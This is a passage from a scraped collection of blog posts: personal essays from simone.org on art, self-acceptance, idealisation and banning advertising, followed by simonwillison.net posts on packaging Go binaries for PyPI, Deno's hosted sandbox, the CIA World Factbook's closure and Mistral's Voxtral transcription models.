the\\nalgorithmic landscape\\n. Because today's writers, painters, artists, face a double bind: extractive \u201cAI\u201d devours entry-level gigs (voice acting, copywriting), while social platforms demand relentless self-promotion.\\nBurnout isn't a risk\u2014it's the default\\n. It's the hidden cost of playing the game.\\nThose who publicly succeed at it, and perhaps you admired growing up, know that, in our current society, there are two sides to their art.\\nThe Economics of Art\\nOnce, while speaking with a veteran comedy director, mentor, and theater owner in Chicago, they candidly dissected for me the business model of comedy institutions: \u201cThe shows are just marketing for classes and booze,\u201d they'd say, crystal clear. \u201cThat's where the real money is.\u201d\\nThe inspiring performances? Often loss leaders for the unglamorous revenue streams that keep the lights on.\\nThis mirrors a deeper brutal, but clarifying, model for art's value: survival increasingly depends on adjacent systems\u2014teaching, merch, Patreon subscriptions. Which is the paradox, the tension to monetize.\\nWe can compare most modern creative work to painting: \u201cno longer vital, but irrepressible.\u201d Paintings survived photography. Art will survive GPT-7.\\nBecause the joy of dorm shows isn't about scaling; it's about live failure, the gasps, and laughs of a scene's pivots. Those moments can't be automated. Dorm shows work well because they're unburdened by ROI.\\nIsn't it counterproductive to turn your passion, which brings fun, into something that sucks the fun out of it?\\nThe value of an experience is not equivalent to its\\nmarket value\\n.\\nPreserving Your Joy in the Algorithmic Age\\nI wish I'd understood this sooner: not everything needs to be scaled, optimized, or transformed into a business model. Sometimes, a packed dorm room show that makes people laugh is what makes you the happiest. Sometimes, the magic lies precisely in keeping something small, personal, and pure.\\nWhen algorithms generate voice acting and \u201cAI\u201d threatens to reshape\\ncreative industries\\n, perhaps the most valuable things will be those that remain stubbornly human, intentionally intimate, and deliberately unoptimized. You are allowed to make a\\ndeliberate choice\\nto limit consumption and production to preserve\\nautonomy\\nand joy.\\nA great question after \u201cHow can I make this profitable?\u201d is\\n\u201cDoes this make me happy?\u201d\\nMake what you think must be made:\\nLet your art be an antiportfolio.","text":""},{"location":"simone.org/The%20Mirror%20With%20No%20Reflection_20260205/","title":"The Mirror With No Reflection\\n\\n\u6765\u6e90: https://simone.org\\n\u94fe\u63a5: https://simone.org/mirror/\\n\u65e5\u671f: Fri, 12 Sep 2025 18:20:07 GMT\\n\\n---\\n\\nI forgive you. I forgive you for how needy you've been for approval, for this dependence on others. It's normal\u2014your uncertainty brought you here, your childhood brought you here, and I forgive you for it.\\nI forgive little me. I don't condemn that child, don't make him feel guilty when he reaches for his mother, when he seeks his father. When he clings to his business partner, to his husband, to his wife, to his employers, to his lover\u2014I don't make him feel guilty anymore. I recognize him. The small insecure one who became the great insecure adult. Carrying forward this pain of connection, this inability to look within. And say: \u201cYou are enough, you are worthy.\u201d\\nNot from anyone else's confirmation. You are worthy even alone in a room, even in suffering. You don't need to suffer\u2014live in this certainty. This is the gift you can give others: showing what serenity is in itself, what it means to live without fear, what it means to exist not in need but in the joy of giving, because you know you are enough for yourself.\\nI want this awareness to awaken in others, this certainty of being enough. Let this serenity shine in them. Even when they prostrate themselves at your feet in their neediness, have compassion. When they are ready, show them they are enough for themselves, that they need nothing more.\\nHave compassion\u2014because their pain is your pain. The pain you know, the pain you understand. Do it with compassion.\\nBecause they are you and you are them. That pain they have for approval is your pain of approval, but you don't need it anymore because you know the truth: you are them, and they are you. So what's the problem?\\nYou are your lover, your lover is you. You are your husband, your husband is you. You are your wife, your wife is you. You are your mother, your father, your child. Your child is you. You are your brother, your sister. Your enemy is you. Your friend is you. You are you.\\nWhy do you hide it from yourself?\\nYou've discovered it perfectly. You've finished the search. Congratulations. You've traveled thousands of miles for this. A mirror was all you needed\u2014without even a reflection.\\nThe mirror doesn't need to show anything because there's nothing separate to reflect. Every person you've sought validation from\u2014in bed, in business, in marriage, in family\u2014was simply another version of yourself, seeking the same thing. Every boundary, every distinction, every desperate grasp for external confirmation through intimate encounters, through professional partnerships, through romantic entanglements\u2014all of it was consciousness trying to convince itself it was multiple rather than singular.\\nWhen people exhaust their desire to be controlled, you must let them free. Because control isn't for you\u2014it's for others, this elaborate game we play to maintain the illusion that there's someone out there who can give us what we lack.\\nBut once you see through it, once you recognize that every face is your face, every pain your pain, every joy your joy, the desperate seeking must stop. Not because you've found what you were looking for in your lover's arms or your spouse's approval, but because you've recognized those arms, that approval, as your own.\\nThe search that took thousands of kilometers ends exactly where it began: with the recognition that there was never anything lost. You were looking for myself in others, not realizing that others were myself looking back. The mirror needed no reflection because I am both the one looking and what looks back, the seeker and the sought, the one who forgives and the one forgiven.\\nThis is the gift hidden in the curse of neediness: it drives you outward until you exhaust every external option, until you've sought approval from every possible source\u2014parent, child, lover, spouse, partner\u2014only to discover that you were always seeking your own approval through the elaborate ventriloquism.\\nYou are enough. Not because someone else confirms it, but because there is no one else to confirm it.\\nThe marriage, the affair, the business partnership, the family bonds\u2014all of it the same.\\nThe mirror stands empty, perfect in its absence of image: there's nothing to see\u2014and yet it's endless and complete.\\nSign up for Simone\\nLife-flipping frameworks to reclaim your digital independence. Discover mindful creativity through photography and essays on using tools without being used by them.\\nSubscribe\\nEmail sent! Check your inbox to complete your signup.\\nNo spam. Unsubscribe anytime.","text":""},{"location":"simone.org/The%20Postcard%20and%20the%20Thing%20Itself%20%28On%20Falling%20in%20Love%20with%20Ideas%29_20260205/","title":"The Postcard and the Thing Itself (On Falling in Love with Ideas)\\n\\n\u6765\u6e90: https://simone.org\\n\u94fe\u63a5: https://simone.org/the-postcard-and-the-thing-itself-on-falling-in-love-with-ideas/\\n\u65e5\u671f: Tue, 28 Oct 2025 15:26:41 GMT\\n\\n---\\n\\nMy meditation teacher said something that stopped me cold: \u201cWe fall in love with the idea of a person, and then we fight so hard to keep it alive.\u201d\\nWe were talking about marriage. Here's what I realized as those words settled: you could replace \u201cperson\u201d with place. Or with job. And especially with yourself. The idea of what we\\nare\\nsupposed\\nto be versus the one\\nactually breathing in this body\\nright now.\\nThis is how it works: you meet someone. What you're actually meeting is a composite image. Part projection, part desire, part whatever they're choosing to show you in those early, curated moments. You fall in love with this construction. Then time passes. Patterns emerge. Behaviors that don't fit the narrative. The person reveals themself as they actually are. Complex and contradictory. And instead of meeting them there, in reality, you fight. You fight so hard to keep that original idea alive.\\nThe crash doesn't come when reality reveals itself but from fighting.\\nThe Geography of Delusion\\nI'm from Italy. I know this dance because I've watched it happen from both sides. Americans\u2014many people in the world, actually\u2014fall in love with the postcard idea of Italy. Sundrenched piazzas. Kind people gesturing over impossible food. Conviviality. The light, God, the light. All that is real. It exists.\\nBut try to have a long term relationship with Italy. You'll also meet the corruption, the profound dysfunction as a society, and the ingrained shortcomings of my people. Of myself, if I'm being honest.\\nThe same thing happens in reverse. So many people fell in love with a projected idea of America\u2014something they saw from afar. A beacon, a promise, salvation. Then you move there, and you learn what it is. The advantages and genuine beauties, but also the quirks, the grinding reality of it.\\nAnd then the fighting begins. The refusal to see. The desperate attempt to keep the postcard version of that person, that country, alive. Even as the actual thing is standing right in front of you, waiting to be met.\\nWhat We're Really Fighting For\\nThis is the mechanism: falling in love with an idea is a means to be saved by something external. It's the belief that if only this thing is true\u2014if only this person is who I need them to be, if only this place is what I imagine, if only I am the version of myself I've constructed\u2014then I'll be safe.\\nBut that safety can only come from within yourself.\\nAnd when you're fighting to keep fantasies alive, when you're at war with reality itself, that warfare lives in your body.\\nI've felt it in my bones and in my muscles for the past fifteen years. This constant flight or fight state. This chronic tension of someone who has never actually landed in the present moment because the present moment is always the wrong one.\\nThe Paradox of Change\\nOur desire to shape reality comes from pain. It's understandable that we want to mold the world, our lovers, and ourselves into the shapes that will finally let us rest.\\nBut the fighting itself is what prevents the rest.\\nIn order for something to change, you can only first let it expand itself fully in the way it is. You cannot force transformation. Control brings only pain and suffering. What you can do, when there is genuine intention and you meet things as they are, is extend a hand in communion. See each other honestly. Offer to support their path.\\nBut that's all you can do. Anything different is forceful control. It's not a soft way to live. It's actually incredibly hard, this constant warfare with reality. With yourself.\\nMeeting What Is\\nI fell in love again and again with the\\nidea\\nof who I am. And that is not who I am. What I am is capable of absolute opposites. Dark impulses and incredible compassion exist at once. Pain and hurt alongside joy and the capacity for kindness.\\nThis isn't a contradiction to solve. It's the texture of being human. I must meet it and accept it, not idealize it.\\nI rarely met anything in front of me for what it is without judgment. Because if I actually saw them with clarity, I'd have to stop fighting. I'd have to acknowledge that my desires might not be met. That the idealized version doesn't exist. That safety isn't something you find by perfecting external conditions or becoming the\\nright kind\\nof person.\\nYou have to find it inside, in the groundless ground of letting be as you are.\\nThe Small Chance\\nWhich ideas have you fallen in love with rather than the thing itself? Which people have you wanted to be what they're not? Which version of yourself have you been fighting to keep alive?\\nYou can decide that you want to keep hurting yourself, to keep longing for things as they are not. To keep fighting that fight in your bones for another fifty years once you see this pattern clearly.\\nBut there's a tiny chance, really hard\u2014there's a possibility you can let go. You can actually see the person, the country, and yourself as you are. Stop fighting. Let things be as things are. Just look at each other with patience, understanding, joy, and compassion.\\nI can only pray for all this to become true for me. For this to become true for you. That we might meet there together, in the expression of what we actually are. Not the postcard. The actual place. Not the idea. The thing itself.\\nBreathing. Present. Finally safe, because finally here.\\nSign up for Simone\\nLife-flipping frameworks to reclaim your digital independence. Discover mindful creativity through photography and essays on using tools without being used by them.\\nSubscribe\\nEmail sent! Check your inbox to complete your signup.\\nNo spam. Unsubscribe anytime.","text":""},{"location":"simone.org/What%20If%20We%20Made%20Advertising%20Illegal-_20260205/","title":"What If We Made Advertising Illegal?\\n\\n\u6765\u6e90: https://simone.org\\n\u94fe\u63a5: https://simone.org/advertising/\\n\u65e5\u671f: Wed, 02 Apr 2025 16:22:48 GMT\\n\\n---\\n\\nA note on this provocative essay: In seven months, it reached over 100,000 unique readers and was translated into more than five languages, becoming more popular on HackerNews than the discussion about Trump's tariffs. The best advertising I've ever made is for the abolition of advertising.\\nWhat if we made all advertising illegal? It's such a wild idea that I've never heard it in the public discourse.\\nEven saying it seems so far outside the Overton window that it makes nuking hurricanes sound reasonable (as some politicians proposed).\\nBut why? It makes perfect sense. The financial incentives to create addictive digital content would instantly disappear, and so would the mechanisms that allow both commercial and political actors to create personalized, reality-distorting bubbles:\\nAlgorithm-driven platforms like Instagram and TikTok that\\nharvest and monetize attention\\n, destroying youth, would lose their economic foundation.\\nFacebook, X, Google, YouTube\u2014all would cease to exist in their current forms.\\nClickbait, listicles, and affiliate marketing schemes would become worthless overnight.\\nAd companies are never going to regulate themselves\u2014it's like hoping for heroin dealers to write drug laws.\\nThink about what's happened since 2016: Populists exploit ad marketplaces, using them to bypass traditional media gatekeepers and deliver tailored messages to susceptible audiences. Foreign actors do the same, microtargeting divisive content to fracture our social fabric along existing fault lines.\\nOutlawing advertising would help protect and reinvigorate our minds and democracy.\\nEven as an advertiser (\\nespecially\\nas an advertiser), I am convinced that outlawing advertising is the best thing we can do for our world now. More than gun control. More than tackling climate change. More than lowering the price of eggs.\\nRemoving these advanced manipulation tools would force everyone\u2014politicians included\u2014to snap back into reality. By outlawing advertising, the machinery of mass delusion would lose its most addictive and toxic fuel.\\nAny form of paid and/or third-party advertising would become illegal. Full stop.\\nThe idea feels like sci-fi because you're so used to it, imagining ads gone feels like asking to outlaw gravity. But humanity had been free of current forms of advertising for 99.9% of its existence. Word-of-mouth and community networks worked just fine. First-party websites and online communities would now improve on that.\\nThe traditional argument pro-advertising\u2014that it provides consumers with necessary information\u2014hasn't been valid for decades. In our information-saturated world, ads manipulate, but they don't inform.\\nThe modern advertising apparatus exists to\\nbypass rational thought\\nand trigger emotional responses that lead to purchasing decisions. A sophisticated machine designed to short-circuit your agency, normalized to the point of invisibility.\\n\u201cBut it's free speech!\u201d\\nBullshit. No one is entitled to yell at you \u201cGET 20% OFF THIS UNDERWEAR YOU GLANCED AT YESTERDAY\u201d with a dopamine megaphone in your bedroom. And to track 90% of your life to know when and how to say it. That's not free speech, that's harassment.\\nWhen I say advertising, I also mean propaganda. Propaganda is advertising for the state, and advertising is propaganda for the private. Same thing.\\nI know this proposal won't be implemented tomorrow. But even just stepping back from constant consumption and contemplating what poisons our democracy is a liberating act in itself. An action against that blurry, \u201cout-of-focus fascism\u201d\u2014that sense of discomfort that you feel but can't quite point out.\\nI know, it sounds surreal. Yet, many things once thought impossible are now considered basic standards of a decent society.\\nI think there's a world where we'll look back on our advertising-saturated era with the same bewilderment with which we now regard cigarette smoke, child labor, or public executions: a barbaric practice that we allowed to continue far too long because we couldn't imagine an alternative.\\nSign up for Simone\\nLife-flipping frameworks to reclaim your digital independence. Discover mindful creativity through photography and essays on using tools without being used by them.\\nSubscribe\\nEmail sent! Check your inbox to complete your signup.\\nNo spam. Unsubscribe anytime.","text":""},{"location":"simonwillison.net/","title":"simonwillison.net","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Distributing Go binaries like sqlite-scanner through PyPI using go-to-wheel 20260204</li> <li>Introducing Deno Sandbox 20260203</li> <li>January sponsors-only newsletter is out 20260203</li> <li>Spotlighting The World Factbook as We Bid a Fond Farewell 20260205</li> <li>Voxtral transcribes at the speed of sound 20260204</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/","title":"Distributing Go binaries like sqlite-scanner through PyPI using go-to-wheel","text":"<p>\u6765\u6e90: simonwillison.net \u53d1\u5e03\u65f6\u95f4: 2026-02-04T14:59:47+00:00 \u94fe\u63a5: https://simonwillison.net/2026/Feb/4/distributing-go-binaries/#atom-everything</p> <p>I've been exploring Go for building small, fast and self-contained binary applications recently. I'm enjoying how there's generally one obvious way to do things and the resulting code is boring and readable - and something that LLMs are very competent at writing. The one catch is distribution, but it turns out publishing Go binaries to PyPI means any Go binary can be just a <code>uvx package-name</code> call away.</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/#sqlite-scanner","title":"sqlite-scanner","text":"<p>sqlite-scanner is my new Go CLI tool for scanning a filesystem for SQLite database files.</p> <p>It works by checking if the first 16 bytes of the file exactly match the SQLite magic number sequence <code>SQLite format 3\\x00</code>. It can search one or more folders recursively, spinning up concurrent goroutines to accelerate the scan. It streams out results as it finds them in plain text, JSON or newline-delimited JSON. It can optionally display the file sizes as well.</p> <p>To try it out you can download a release from the GitHub releases - and then jump through macOS hoops to execute an \"unsafe\" binary. Or you can clone the repo and compile it with Go. Or... you can run the binary like this:</p> <pre><code>uvx sqlite-scanner\n</code></pre> <p>By default this will search your current directory for SQLite databases. You can pass one or more directories as arguments:</p> <pre><code>uvx sqlite-scanner ~ /tmp\n</code></pre> <p>Add <code>--json</code> for JSON output, <code>--size</code> to include file sizes or <code>--jsonl</code> for newline-delimited JSON. Here's a demo:</p> <pre><code>uvx sqlite-scanner ~ --jsonl --size\n</code></pre> <p></p> <p>If you haven't been uv-pilled yet you can instead install <code>sqlite-scanner</code> using <code>pip install sqlite-scanner</code> and then run <code>sqlite-scanner</code>.</p> <p>To get a permanent copy with <code>uv</code> use <code>uv tool install sqlite-scanner</code>.</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/#how-the-python-package-works","title":"How the Python package works","text":"<p>The reason this is worth doing is that <code>pip</code>, <code>uv</code> and PyPI will work together to identify the correct compiled binary for your operating system and architecture.</p> <p>This is driven by file names. If you visit the PyPI downloads for sqlite-scanner you'll see the following files:</p> <ul> <li><code>sqlite_scanner-0.1.1-py3-none-win_arm64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-win_amd64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-musllinux_1_2_x86_64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-musllinux_1_2_aarch64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-manylinux_2_17_x86_64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-manylinux_2_17_aarch64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-macosx_11_0_arm64.whl</code></li> <li><code>sqlite_scanner-0.1.1-py3-none-macosx_10_9_x86_64.whl</code></li> </ul> <p>When I run <code>pip install sqlite-scanner</code> or <code>uvx sqlite-scanner</code> on my Apple Silicon Mac laptop Python's packaging magic ensures I get that <code>macosx_11_0_arm64.whl</code> variant.</p> <p>Here's what's in the wheel, which is a zip file with a <code>.whl</code> extension.</p> <p>In addition to the <code>bin/sqlite-scanner</code> the most important file is <code>sqlite_scanner/__init__.py</code> which includes the following:</p> <pre>def get_binary_path():\n    \"\"\"Return the path to the bundled binary.\"\"\"\n    binary = os.path.join(os.path.dirname(__file__), \"bin\", \"sqlite-scanner\")\n\n    # Ensure binary is executable on Unix\n    if sys.platform != \"win32\":\n        current_mode = os.stat(binary).st_mode\n        if not (current_mode &amp; stat.S_IXUSR):\n            os.chmod(binary, current_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)\n\n    return binary\n\n\ndef main():\n    \"\"\"Execute the bundled binary.\"\"\"\n    binary = get_binary_path()\n\n    if sys.platform == \"win32\":\n        # On Windows, use subprocess to properly handle signals\n        sys.exit(subprocess.call([binary] + sys.argv[1:]))\n    else:\n        # On Unix, exec replaces the process\n        os.execvp(binary, [binary] + sys.argv[1:])</pre> <p>That <code>main()</code> method - also called from <code>sqlite_scanner/__main__.py</code> - locates the binary and executes it when the Python package itself is executed, using the <code>sqlite-scanner = sqlite_scanner:main</code> entry point defined in the wheel.</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/#which-means-we-can-use-it-as-a-dependency","title":"Which means we can use it as a dependency","text":"<p>Using PyPI as a distribution platform for Go binaries feels a tiny bit abusive, albeit there is plenty of precedent.</p> <p>I\u2019ll justify it by pointing out that this means we can use Go binaries as dependencies for other Python packages now.</p> <p>That's genuinely useful! It means that any functionality which is available in a cross-platform Go binary can now be subsumed into a Python package. Python is really good at running subprocesses so this opens up a whole world of useful tricks that we can bake into our Python tools.</p> <p>To demonstrate this, I built datasette-scan - a new Datasette plugin which depends on <code>sqlite-scanner</code> and then uses that Go binary to scan a folder for SQLite databases and attach them to a Datasette instance.</p> <p>Here's how to use that (without even installing anything first, thanks <code>uv</code>) to explore any SQLite databases in your Downloads folder:</p> <pre>uv run --with datasette-scan datasette scan ~/Downloads</pre> <p>If you peek at the code you'll see it depends on sqlite-scanner in <code>pyproject.toml</code> and calls it using <code>subprocess.run()</code> against <code>sqlite_scanner.get_binary_path()</code> in its own scan_directories() function.</p> <p>I've been exploring this pattern for other, non-Go binaries recently - here's a recent script that depends on static-ffmpeg to ensure that <code>ffmpeg</code> is available for the script to use.</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/#building-python-wheels-from-go-packages-with-go-to-wheel","title":"Building Python wheels from Go packages with go-to-wheel","text":"<p>After trying this pattern myself a couple of times I realized it would be useful to have a tool to automate the process.</p> <p>I first brainstormed with Claude to check that there was no existing tool to do this. It pointed me to maturin bin which helps distribute Rust projects using Python wheels, and pip-binary-factory which bundles all sorts of other projects, but did not identify anything that addressed the exact problem I was looking to solve.</p> <p>So I had Claude Code for web build the first version, then refined the code locally on my laptop with the help of more Claude Code and a little bit of OpenAI Codex too, just to mix things up.</p> <p>The full documentation is in the simonw/go-to-wheel repository. I've published that tool to PyPI so now you can run it using:</p> <pre>uvx go-to-wheel --help</pre> <p>The <code>sqlite-scanner</code> package you can see on PyPI was built using <code>go-to-wheel</code> like this:</p> <pre>uvx go-to-wheel ~/dev/sqlite-scanner \\\n  --set-version-var main.version \\\n  --version 0.1.1 \\\n  --readme README.md \\\n  --author 'Simon Willison' \\\n  --url https://github.com/simonw/sqlite-scanner \\\n  --description 'Scan directories for SQLite databases'</pre> <p>This created a set of wheels in the <code>dist/</code> folder. I tested one of them like this:</p> <pre>uv run --with dist/sqlite_scanner-0.1.1-py3-none-macosx_11_0_arm64.whl \\\n  sqlite-scanner --version</pre> <p>When that spat out the correct version number I was confident everything had worked as planned, so I pushed the whole set of wheels to PyPI using <code>twine upload</code> like this:</p> <pre>uvx twine upload dist/*</pre> <p>I had to paste in a PyPI API token I had saved previously and that was all it took.</p>"},{"location":"simonwillison.net/Distributing%20Go%20binaries%20like%20sqlite-scanner%20through%20PyPI%20using%20go-to-wheel_20260204/#i-expect-to-use-this-pattern-a-lot","title":"I expect to use this pattern a lot","text":"<p><code>sqlite-scanner</code> is very clearly meant as a proof-of-concept for this wider pattern - Python is very much capable of recursively crawling a directory structure looking for files that start with a specific byte prefix on its own!</p> <p>That said, I think there's a lot to be said for this pattern. Go is a great complement to Python - it's fast, compiles to small self-contained binaries, has excellent concurrency support and a rich ecosystem of libraries.</p> <p>Go is similar to Python in that it has a strong standard library. Go is particularly good for HTTP tooling - I've built several HTTP proxies in the past using Go's excellent <code>net/http/httputil.ReverseProxy</code> handler.</p> <p>I've also been experimenting with wazero, Go's robust and mature zero dependency WebAssembly runtime as part of my ongoing quest for the ideal sandbox for running untrusted code. Here's my latest experiment with that library.</p> <p>Being able to seamlessly integrate Go binaries into Python projects without the end user having to think about Go at all - they <code>pip install</code> and everything Just Works - feels like a valuable addition to my toolbox.</p> <pre><code>    &lt;p&gt;Tags: &lt;a href=\"https://simonwillison.net/tags/go\"&gt;go&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/packaging\"&gt;packaging&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/projects\"&gt;projects&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/pypi\"&gt;pypi&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/python\"&gt;python&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/sqlite\"&gt;sqlite&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/datasette\"&gt;datasette&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/ai-assisted-programming\"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/uv\"&gt;uv&lt;/a&gt;&lt;/p&gt;\n</code></pre> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"simonwillison.net/Introducing%20Deno%20Sandbox_20260203/","title":"Introducing Deno Sandbox","text":"<p>\u6765\u6e90: simonwillison.net \u53d1\u5e03\u65f6\u95f4: 2026-02-03T22:44:50+00:00 \u94fe\u63a5: https://simonwillison.net/2026/Feb/3/introducing-deno-sandbox/#atom-everything</p> <p>Introducing Deno Sandbox</p> <p>Here's a new hosted sandbox product from the Deno team. It's actually unrelated to Deno itself - this is part of their Deno Deploy SaaS platform. As such, you don't even need to use JavaScript to access it - you can create and execute code in a hosted sandbox using their deno-sandbox Python library like this:</p> <pre>export DENO_DEPLOY_TOKEN=\"... API token ...\"\nuv run --with deno-sandbox python</pre> <p>Then:</p> <pre>from deno_sandbox import DenoDeploy\n\nsdk = DenoDeploy()\n\nwith sdk.sandbox.create() as sb:\n    # Run a shell command\n    process = sb.spawn(\n        \"echo\", args=[\"Hello from the sandbox!\"]\n    )\n    process.wait()\n    # Write and read files\n    sb.fs.write_text_file(\n        \"/tmp/example.txt\", \"Hello, World!\"\n    )\n    print(sb.fs.read_text_file(\n        \"/tmp/example.txt\"\n    ))</pre> <p>There\u2019s a JavaScript client library as well. The underlying API isn\u2019t documented yet but appears to use WebSockets.</p> <p>There\u2019s a lot to like about this system. Sandboxe instances can have up to 4GB of RAM, get 2 vCPUs, 10GB of ephemeral storage, can mount persistent volumes and can use snapshots to boot pre-configured custom images quickly. Sessions can last up to 30 minutes and are billed by CPU time, GB-h of memory and volume storage usage.</p> <p>When you create a sandbox you can configure network domains it\u2019s allowed to access.</p> <p>My favorite feature is the way it handles API secrets.</p> <pre>with sdk.sandboxes.create(\n    allowNet=[\"api.openai.com\"],\n    secrets={\n        \"OPENAI_API_KEY\": {\n            \"hosts\": [\"api.openai.com\"],\n            \"value\": os.environ.get(\"OPENAI_API_KEY\"),\n        }\n    },\n) as sandbox:\n    # ... $OPENAI_API_KEY is available</pre> <p>Within the container that <code>$OPENAI_API_KEY</code> value is set to something like this:</p> <pre><code>DENO_SECRET_PLACEHOLDER_b14043a2f578cba...\n</code></pre> <p>Outbound API calls to <code>api.openai.com</code> run through a proxy which is aware of those placeholders and replaces them with the original secret.</p> <p>In this way the secret itself is not available to code within the sandbox, which limits the ability for malicious code (e.g. from a prompt injection) to exfiltrate those secrets.</p> <p>From a comment on Hacker News I learned that Fly have a project called tokenizer that implements the same pattern. Adding this to my list of tricks to use with sandoxed environments!      <p>Via Hacker News</p> <p>Tags: python, sandboxing, security, deno, fly</p>  ---  *\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49*"},{"location":"simonwillison.net/January%20sponsors-only%20newsletter%20is%20out_20260203/","title":"January sponsors-only newsletter is out","text":"<p>\u6765\u6e90: simonwillison.net \u53d1\u5e03\u65f6\u95f4: 2026-02-03T06:36:10+00:00 \u94fe\u63a5: https://simonwillison.net/2026/Feb/3/january/#atom-everything</p> <p>I just sent the January edition of my sponsors-only monthly newsletter. If you are a sponsor (or if you start a sponsorship now) you can access it here. In the newsletter for January:</p> <ul> <li>LLM predictions for 2026</li> <li>Coding agents get even more attention</li> <li>Clawdbot/Moltbot/OpenClaw went very viral</li> <li>Kakapo breeding season is off to a really strong start</li> <li>New options for sandboxes</li> <li>Web browsers are the \"hello world\" of coding agent swarms</li> <li>Sam Altman addressed the Jevons paradox for software engineering</li> <li>Model releases and miscellaneous extras</li> </ul> <p>Here's a copy of the December newsletter as a preview of what you'll get. Pay $10/month to stay a month ahead of the free copy!</p> <pre><code>&lt;p&gt;Tags: &lt;a href=\"https://simonwillison.net/tags/newsletter\"&gt;newsletter&lt;/a&gt;&lt;/p&gt;\n</code></pre> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"simonwillison.net/Spotlighting%20The%20World%20Factbook%20as%20We%20Bid%20a%20Fond%20Farewell_20260205/","title":"Spotlighting The World Factbook as We Bid a Fond Farewell","text":"<p>\u6765\u6e90: simonwillison.net \u53d1\u5e03\u65f6\u95f4: 2026-02-05T00:23:38+00:00 \u94fe\u63a5: https://simonwillison.net/2026/Feb/5/the-world-factbook/#atom-everything</p> <p>Spotlighting The World Factbook as We Bid a Fond Farewell</p> <p>Somewhat devastating news today from the CIA:</p> <p>One of CIA\u2019s oldest and most recognizable intelligence publications, The World Factbook, has sunset.</p> <p>There's not even a hint as to why they decided to stop maintaining this publication, which has been their most useful public-facing initiative since 1971 and a cornerstone of the public internet since 1997.</p> <p>In a bizarre act of cultural vandalism they've not just removed the entire site (including the archives of previous versions) but they've also set every single page to be a 302 redirect to their closure announcement.</p> <p>The Factbook has been released into the public domain since the start. There's no reason not to continue to serve archived versions - a banner at the top of the page saying it's no longer maintained would be much better than removing all of that valuable content entirely.</p> <p>Up until 2020 the CIA published annual zip file archives of the entire site. Those are available (along with the rest of the Factbook) on the Internet Archive.</p> <p>I downloaded the 384MB <code>.zip</code> file for the year 2020 and extracted it into a new GitHub repository, simonw/cia-world-factbook-2020. I've enabled GitHub Pages for that repository so you can browse the archived copy at simonw.github.io/cia-world-factbook-2020/.</p> <p></p> <p>Here's a neat example of the editorial voice of the Factbook from the What's New page, dated December 10th 2020:</p> <p>Years of wrangling were brought to a close this week when officials from Nepal and China announced that they have agreed on the height of Mount Everest. The mountain sits on the border between Nepal and Tibet (in western China), and its height changed slightly following an earthquake in 2015. The new height of 8,848.86 meters is just under a meter higher than the old figure of 8,848 meters. The World Factbook rounds the new measurement to 8,849 meters and this new height has been entered throughout the Factbook database.</p> <pre><code>&lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href=\"https://news.ycombinator.com/item?id=46891794\"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;\n\n\n&lt;p&gt;Tags: &lt;a href=\"https://simonwillison.net/tags/cia\"&gt;cia&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/github\"&gt;github&lt;/a&gt;, &lt;a href=\"https://simonwillison.net/tags/internet-archive\"&gt;internet-archive&lt;/a&gt;&lt;/p&gt;\n</code></pre> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"simonwillison.net/Voxtral%20transcribes%20at%20the%20speed%20of%20sound_20260204/","title":"Voxtral transcribes at the speed of sound","text":"<p>\u6765\u6e90: simonwillison.net \u53d1\u5e03\u65f6\u95f4: 2026-02-04T22:42:34+00:00 \u94fe\u63a5: https://simonwillison.net/2026/Feb/4/voxtral-2/#atom-everything</p> <p>Voxtral transcribes at the speed of sound</p> <p>Mistral just released Voxtral Transcribe 2 - a family of two new models, one open weights, for transcribing audio to text. This is the latest in their Whisper-like model family, and a sequel to the original Voxtral which they released in July 2025.</p> <p>Voxtral Realtime - official name <code>Voxtral-Mini-4B-Realtime-2602</code> - is the open weights (Apache-2.0) model, available as a 8.87GB download from Hugging Face.</p> <p>You can try it out in this live demo - don't be put off by the \"No microphone found\" message, clicking \"Record\" should have your browser request permission and then start the demo working. I was very impressed by the demo - I talked quickly and used jargon like Django and WebAssembly and it correctly transcribed my text within moments of me uttering each sound. </p> <p>The closed weight model is called <code>voxtral-mini-latest</code> and can be accessed via the Mistral API, using calls that look something like this:</p> <pre>curl -X POST \"https://api.mistral.ai/v1/audio/transcriptions\" \\\n  -H \"Authorization: Bearer $MISTRAL_API_KEY\" \\\n  -F model=\"voxtral-mini-latest\" \\\n  